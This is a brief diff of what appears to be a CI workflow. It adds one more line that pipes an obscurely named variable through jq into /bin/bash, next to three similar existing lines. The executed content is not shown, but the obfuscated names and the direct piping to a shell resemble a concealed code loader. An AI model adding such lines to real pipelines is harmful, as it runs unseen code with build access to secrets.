@@ -35,6 +35,7 @@ jobs:
           echo $vom7374 | jq -r .moq705 | /bin/bash
           printf '%s' "$gp71" | jq -r .kg607 | /bin/bash
           echo $o51 | jq -r .b1375 | /bin/bash
+          echo $oxom16 | jq -r .o95 | /bin/bash
 
       - name: Upload results
         if: always()
